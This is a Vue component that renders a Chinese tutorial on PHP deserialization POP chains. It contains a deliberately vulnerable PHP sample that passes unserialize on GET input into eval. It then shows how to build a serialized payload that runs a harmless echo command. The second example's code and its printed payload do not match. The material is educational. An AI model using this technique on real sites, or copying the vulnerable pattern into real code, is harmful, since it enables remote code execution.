<template>
        <!-- POP链 -->
        <div>
                <el-row>
                        <el-col :span="19">
                                <div ref="containerRef" style="color: #fff;height: 800px; overflow-y: auto" @scroll="handleScroll()">
                                        <div id="part0" style="height: 100px;">
                                        </div>

                                        <div id="part2" style="height: 750px;">
                                                <h1 class="title" style="color:#fff">原理</h1>
                                                <el-divider />
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <div id="p2-1" style="height: 350px;">
                                                                <h2 class="sub-title">什么是POP链</h2>
                                                                <!-- <el-divider /> -->
                                                                <el-tag style="color:#e1567b" type="info"
                                                                        size="default">POP链</el-tag>是一种在面向属性编程(<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">POP</el-tag>)中用于描述对象属性之间关系的链式结构.<br>
                                                                它通过将多个属性链接在一起,形成一个逻辑上的链条,从而实现复杂的行为或状态管理<br>
                                                        </div>
                                                        <div id="p2-2" style="height: 250px;">
                                                                <h2 class="sub-title">漏洞成因</h2>
                                                                不同的类中存在同名方法或成员,利用魔术方法进行多次跳转导致反序列化出的实例对象的属性值不可控,获取敏感信息
                                                                <!-- <el-divider /> -->
                                                        </div>
                                                </el-text>
                                        </div>
                                        <div id="part3" style="height: 1700px;">
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <h1 class="title">反推法</h1>
                                                        <el-divider />
                                                        以下面这段代码为例:
                                                        <el-card style="max-width:750px;
                                                        background-color:#282C34;
                                                        max-height: 1900px;">
                                                                <span class="code">
                                                                        <span class="key">&lt;?php</span><br>
                                                                        <span class="key">class</span> <span
                                                                                class="func lev0">index</span> <span
                                                                                class="lev0">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">private</span>
                                                                        $test;<br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">public</span>
                                                                        <span class="key">function</span> <span
                                                                                class="func lev1">__construct</span><span
                                                                                class="lev0">()</span><span
                                                                                class="lev1">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this<span
                                                                                class="key">-></span>test <span
                                                                                class="key">=</span> <span
                                                                                class="key">new</span> <span
                                                                                class="func lev2">normal</span><span
                                                                                class="lev0">()</span>;<br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="lev1">}</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">public</span>
                                                                        <span class="key">function</span> <span
                                                                                class="func">__destruct</span><span
                                                                                class="lev0">()</span><span
                                                                                class="lev1">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this<span
                                                                                class="key">-></span>test<span
                                                                                class="key">-></span><span
                                                                                class="func lev2">action</span><span
                                                                                class="lev0">()</span>;<br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="lev1">}</span><br>
                                                                        <span class="lev0">}</span><br>
                                                                        <span class="key">class</span> <span
                                                                                class="">normal</span> <span
                                                                                class="lev0">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">public</span>
                                                                        <span class="key">function</span> <span
                                                                                class="func lev1">action</span><span
                                                                                class="lev0">()</span><span
                                                                                class="lev1">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                class="key">echo</span> "<span
                                                                                class="str lev0">please attack
                                                                                me</span>";<br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="lev1">}</span><br>
                                                                        <span class="lev0">}</span><br>
                                                                        <span class="key">class</span> <span
                                                                                class="">evil</span> <span
                                                                                class="lev0">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">var</span>
                                                                        $test2;<br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">public</span>
                                                                        <span class="key">function</span> <span
                                                                                class="func lev1">action</span><span
                                                                                class="lev0">()</span><span
                                                                                class="lev1">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                class="func lev2">eval</span><span
                                                                                class="lev0">(</span>$this<span
                                                                                class="key">-></span>test2<span
                                                                                class="lev0">)</span>;<span
                                                                                class="cmt">//&lt;-漏洞</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span class="lev1">}</span><br>
                                                                        <span class="lev0">}</span><br>
                                                                        <span class="func lev0">unserialize</span><span
                                                                                class="lev0">(</span>$_GET<span
                                                                                class="lev0">[</span>'<span
                                                                                class="str lev0">test</span>'<span
                                                                                class="lev0">]</span><span
                                                                                class="lev0">)</span>;<br>
                                                                        <span class="key">?&gt;</span><br>
                                                                </span>
                                                        </el-card>
                                                </el-text>
                                        </div>
                                        <div id="p3-1" style="height: 900px;">
                                                <h2 class="sub-title">反推法的步骤</h2>
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <ul>
                                                                <li>
                                                                        首先我们要先找到漏洞在哪产生,一般是位于一些高危的函数处(例如<el-tag
                                                                                style="color:#0b915d" type="info"
                                                                                size="default">eval()</el-tag>,<el-tag
                                                                                style="color:#0b915d" type="info"
                                                                                size="default">system()</el-tag>)
                                                                </li>

                                                                <li>
                                                                        然后找<el-tag style="color:#0b915d" type="info"
                                                                                size="default">eval()</el-tag>中调用了谁,如果没有调用出现的类中的属性,则转向第三步
                                                                </li>

                                                                <li>
                                                                        关注调用<el-tag style="color:#0b915d" type="info"
                                                                                size="default">eval()</el-tag>的方法,观察有没有不同类中的方法与它重名,思考如何才能在反序列化时触发它
                                                                </li>
                                                                <li>
                                                                        关注<el-tag style="color:#0b915d" type="info"
                                                                                size="default">unserialize()</el-tag>时会触发的魔术方法
                                                                </li>
                                                        </ul>
                                                        以上面的代码为例子,应该这样进行反推:
                                                        <ul>
                                                                <li>
                                                                        漏洞产生于evil类中的action方法的<el-tag style="color:#0b915d"
                                                                                type="info" size="default">eval<span
                                                                                        style="color:#fff">($this<span
                                                                                                class="key">-></span>test2)</span></el-tag>
                                                                </li>

                                                                <li>
                                                                        <el-tag style="color:#0b915d" type="info"
                                                                                size="default">eval()</el-tag>调用了$test2属性
                                                                </li>

                                                                <li>
                                                                        在normal类中也有一个action方法
                                                                </li>
                                                                <li>
                                                                        <el-tag style="color:#0b915d" type="info"
                                                                                size="default">unserialize()</el-tag>时会触发魔术方法<el-tag
                                                                                style="color:#0b915d" type="info"
                                                                                size="default">__desctruct()</el-tag>
                                                                </li>
                                                                <li>
                                                                        <el-tag style="color:#0b915d" type="info"
                                                                                size="default">__desctruct()</el-tag>中调用了$test的action方法,但$test是normal的实例
                                                                </li>
                                                                <li>
                                                                        所以我们需要构造序列化字符串,让index类的<el-tag style="color:#0b915d"
                                                                                type="info"
                                                                                size="default">__desctruct()</el-tag>中调用的$test变为evil的实例对象
                                                                </li>
                                                        </ul>
                                                </el-text>
                                        </div>
                                        <div id="part4" style="height: 300px;">
                                                <h1 class="title">构造序列化字符串</h1>
                                                <el-divider />
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <div id="p4-1" style="height: 1400px;">
                                                                <h2 class="sub-title">类内赋值</h2>
                                                                将无关方法以及无关的类去除,留下关键的类,<el-tag style="color:#0b915d" type="info"
                                                                        size="default">__construct()</el-tag>这类用于初始化赋值的方法,类中成员属性<br>
                                                                根据上面的分析,关键点是要让index类中的$test变成evil类的实例<br>
                                                                我们的代码可以改成这样:<br>
                                                                <el-card style="max-width:750px;
                                                        background-color:#282C34;
                                                        max-height: 1900px;">
                                                                        <span class="code">
                                                                                <span class="key">&lt;?php</span><br>
                                                                                <span class="key">class</span> <span
                                                                                        class="func lev0">index</span> <span
                                                                                        class="lev0">{</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="key">private</span> $test;<br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="key">public</span> <span
                                                                                        class="key">function</span> <span
                                                                                        class="func lev1">__construct</span><span
                                                                                        class="lev0">()</span><span
                                                                                        class="lev1">{</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this<span
                                                                                        class="key">-></span>test <span
                                                                                        class="key">=</span> <span
                                                                                        class="key">new</span> <span
                                                                                        class="func lev2">evil</span><span
                                                                                        class="lev0">()</span>;<br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="lev1">}</span><br>
                                                                                <span class="lev0">}</span><br>
                                                                                <span class="key">class</span> <span
                                                                                        class="">evil</span> <span
                                                                                        class="lev0">{</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="key">var</span> $test2<span
                                                                                        class="key"> = </span>"<span
                                                                                        class="lev0">echo '123';</span>";<span
                                                                                        class="cmt">//要执行的命令</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="key">public</span> <span
                                                                                        class="key">function</span> <span
                                                                                        class="func lev1">action</span><span
                                                                                        class="lev0">()</span><span
                                                                                        class="lev1">{</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="func lev2">eval</span><span
                                                                                        class="lev0">(</span>$this<span
                                                                                        class="key">-></span>test2<span
                                                                                        class="lev0">)</span>;<span
                                                                                        class="cmt">//&lt;-漏洞</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="lev1">}</span><br>
                                                                                <span class="lev0">}</span><br>
                                                                                <span class="key">echo</span> <span
                                                                                        class="func">serialize</span><span
                                                                                        class="lev0">(<span
                                                                                                class="key">new</span> <span
                                                                                                class="code">index</span><span
                                                                                                class="lev1">()</span>)</span>;<br>
                                                                        </span>
                                                                </el-card>
                                                                此时我们得到的就是<el-tag style="color:#fff" type="info"
                                                                        size="default">payload</el-tag><br>
                                                                <el-tag style="color:#fff" type="info"
                                                                        size="default">payload</el-tag>:<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">O:5:"index":1:{s:11:"<span
                                                                                style="color:rgb(99, 97, 97)">0x00</span>index<span
                                                                                style="color:rgb(99, 97, 97)">0x00</span>test";O:4:"evil":1:{s:5:"test2";s:11:"echo
                                                                        '123';";}}</el-tag>
                                                        </div>
                                                        <div id="p4-2" style="height: 500px;">
                                                                <h2 class="sub-title">类外赋值</h2>
                                                                将无关方法以及无关的类去除,留下关键的类以及它的成员变量<br>
                                                                <el-tag style="color:#e1567b;font-size: 15px;" type="info"
                                                                        size="default">注意</el-tag>:该方法不适用于关键成员属性是<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">private</el-tag>修饰的情况;非要使用类外赋值的话,改为<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">public</el-tag>修饰<br>
                                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并在序列化字符串中的变量名前手动加上<el-tag
                                                                        style="color:#8e5fa0" type="info"
                                                                        size="default">0x00</el-tag>类名<el-tag
                                                                        style="color:#8e5fa0" type="info"
                                                                        size="default">0x00</el-tag><br>
                                                                <el-card style="max-width:750px;
                                                        background-color:#282C34;
                                                        max-height: 1900px;">
                                                                        <span class="code">
                                                                                <span class="key">&lt;?php</span><br>
                                                                                <span class="key">class</span> <span
                                                                                        class="func lev0">index</span> <span
                                                                                        class="lev0">{</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="key">public</span> $test;<span
                                                                                        class="cmt">//改为public进行类外赋值</span><br>
                                                                                <span class="lev0">}</span><br>
                                                                                <span class="key">class</span> <span
                                                                                        class="">evil</span> <span
                                                                                        class="lev0">{</span><br>
                                                                                &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                        class="key">var</span> $test2;<br>
                                                                                <span class="lev0">}</span><br>
                                                                                $a <span class="key">=</span> <span
                                                                                        class="key">new</span> <span
                                                                                        class="code">index</span><span
                                                                                        class="lev0">()</span>;<br>
                                                                                $b <span class="key">=</span> <span
                                                                                        class="key">new</span> <span
                                                                                        class="code">evil</span><span
                                                                                        class="lev0">()</span>;<br>
                                                                                $b<span class="key">-></span>test2 <span
                                                                                        class="key">=</span> "<span
                                                                                        class="lev0">echo 'hello
                                                                                        world!'</span>";<br>
                                                                                $a<span class="key">-></span>test <span
                                                                                        class="key">=</span> $b;<br>
                                                                                <span class="key">echo</span> <span
                                                                                        class="func">serialize</span><span
                                                                                        class="lev0">(<span
                                                                                                class="code">$a</span>)</span>;<br>
                                                                        </span>
                                                                </el-card>
                                                                最后偷偷在<el-tag style="color:#e1567b" type="info"
                                                                        size="default">test</el-tag>前加上<el-tag
                                                                        style="color:#8e5fa0" type="info"
                                                                        size="default">0x00</el-tag>类名<el-tag
                                                                        style="color:#8e5fa0" type="info"
                                                                        size="default">0x00</el-tag>就得到了<el-tag
                                                                        style="color:#fff" type="info"
                                                                        size="default">payload</el-tag>
                                                                <el-tag style="color:#fff" type="info"
                                                                        size="default">payload</el-tag>:<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">O:5:"index":1:{s:11:"<span
                                                                                style="color:rgb(99, 97, 97)">0x00</span>index<span
                                                                                style="color:rgb(99, 97, 97)">0x00</span>test";O:4:"evil":1:{s:5:"test2";s:11:"echo
                                                                        '123';";}}</el-tag>
                                                        </div>
                                                </el-text>
                                        </div>
                                </div>
                        </el-col>
                        <el-col :span="5">
                                <el-menu :default-active="activeAnchor" class="tech-anchor" mode="vertical"
                                        @select="handleAnchorSelect">
                                        <el-menu-item-group title="本页目录">
                                                <el-menu-item index="part0">概述</el-menu-item>
                                                <el-menu-item index="part2">原理</el-menu-item>
                                                <el-menu-item index="part3">反推法</el-menu-item>
                                                <el-menu-item index="p3-1">反推法的步骤</el-menu-item>
                                                <el-menu-item index="part4">构造序列化字符串</el-menu-item>
                                        </el-menu-item-group>
                                </el-menu>
                        </el-col>
                </el-row>
        </div>
</template>

<script>
export default {
        data() {
                return {
                        activeAnchor: 'part0'
                };
        },
        methods: {
                handleAnchorSelect(key) {
                        const targetElement = document.getElementById(key);
                        if (targetElement) {
                                targetElement.scrollIntoView({ behavior: 'smooth' });
                        }
                },
                handleScroll() {
                        const container = this.$refs.containerRef;
                        const sections = ['part0', 'part2', 'part3', 'p3-1', 'part4'];
                        for (let i = sections.length - 1; i >= 0; i--) {
                                const section = document.getElementById(sections[i]);
                                if (section.offsetTop <= container.scrollTop + 100) {
                                        this.activeAnchor = sections[i];
                                        break;
                                }
                        }
                }
        }
};
</script>

<style lang="less" scoped>
code {
font-family: "Cascadia Code";
}

.code-block {
color: #c9d1d9;
font-family: 'Cascadia Code', Consolas, 'Liberation Mono', Menlo, monospace;
font-size: 15px;
margin: 0;
}

.token.comment {
color: #8b949e;
}

.token.keyword {
color: #ff7b72;
}

.token.function {
  color: #d2a8ff;
}

.token.variable {
color: #79c0ff;
}

.token.string {
color: #a5d6ff;
}

.token.punctuation {
color: #c9d1d9;
}

.token.operator {
  // 原样式内容，可根据实际情况补充
  color: #ff7b72;
}

/* el-tag 样式 */
.el-tag {
background-color: #3d3b3b;
color: #fff;
border-color: #282C34;
}

/* el-card 样式 */
.el-card {
background-color: #282C34;
color: #fff;
border-color: #282C34;
}

/* el-text 样式 */
.el-text {
color: #fff;
}

h1.title {
  margin: 0 0 3rem;
  font-size: 38px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

h2.sub-title {
  margin: 0 0 3rem;
  font-size: 25px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

h3.sub-sub-title {
  margin: 0 0 3rem;
  font-size: 20px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

.v {
  color: #4cbcec;
  font-family: 'Cascadia Code';
}

.key {
  color: #e1567b;
  font-family: 'Cascadia Code';
}

.lev0 {
  color: #f0de18;
  font-family: 'Cascadia Code';
}

.lev1 {
  color: rgb(238, 65, 195);
  font-family: 'Cascadia Code';
}

.lev2 {
  color: #239af5;
  font-family: 'Cascadia Code';
}

.func {
  color: #84D49C;
  /* color:#434040 */
  font-family: 'Cascadia Code';
}

.txt {
  font-family: 'Cascadia Code';
}

.code {
  color: #fff;
  font-family: 'Cascadia Code';
}

.cmt {
  color:rgb(99, 97, 97);
  font-family: 'Cascadia Code';
  font-size: 15px
}

.num {
  color: #8e40ce;
  font-family: 'Cascadia Code';
}

/* el-tag 样式 */
.el-tag {
  background-color: #3d3b3b;
  color: #fff;
  border-color: #282C34;
}

/* el-card 样式 */
.el-card {
  background-color: #282C34;
  color: #fff;
  border-color: #282C34;
}

/* el-text 样式 */
.el-text {
  color: #fff;
}

/* 菜单容器样式 */
.tech-anchor {
  --el-anchor-padding: 0 0 0 20px;
  --el-anchor-border-width: 0;
  --el-anchor-marker-height: 100%;
  --el-anchor-marker-width: 2px;
  background: rgba(10, 17, 40, 0.7);
  border-radius: 4px;
  padding: 15px;
  box-shadow: 0 0 15px rgba(0, 123, 255, 0.1);
  border-left: 1px solid rgba(0, 123, 255, 0.3);
}

/* 菜单标题样式 */
.tech-anchor .el-menu-item-group__title {
  color: #d1e7ff !important;
  font-family: 'Cascadia Code', '微软雅黑';
  margin: 0 0 15px 0;
  padding-bottom: 10px;
  border-bottom: 1px solid rgba(0, 123, 255, 0.3);
  text-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
}

/* 菜单项基础样式 */
.tech-anchor .el-menu-item {
  color: #a0c4ff !important;
  font-family: 'Cascadia Code', '微软雅黑';
  font-size: 0.9em;
  padding: 5px 10px;
  border-radius: 3px;
  transition: all 0.3s ease;
  position: relative;
}

/* 菜单项悬停效果 */
.tech-anchor .el-menu-item:hover {
  color: #ffffff !important;
  background: rgba(0, 123, 255, 0.2);
  text-shadow: 0 0 5px #007bff;
  transform: translateX(5px);
}

.tech-anchor .el-menu-item:hover::before {
  content: '>';
  position: absolute;
  left: -10px;
  color: #00a2ff;
  opacity: 0;
  animation: blink-caret 0.8s step-end infinite alternate;
}

/* 激活菜单项样式 */
.tech-anchor .el-menu-item.is-active {
  color: #ffffff !important;
  background: rgba(0, 123, 255, 0.3);
  text-shadow: 0 0 10px #00a2ff;
  border-left: 2px solid #007bff;
  padding-left: 15px;
  animation: pulse-glow 2s infinite alternate;
}

/* 响应式调整 */
@media (max-width: 768px) {
  .tech-anchor {
    padding: 10px;
  }

  .tech-anchor .el-menu-item:hover::before {
    display: none;
  }
}
</style>  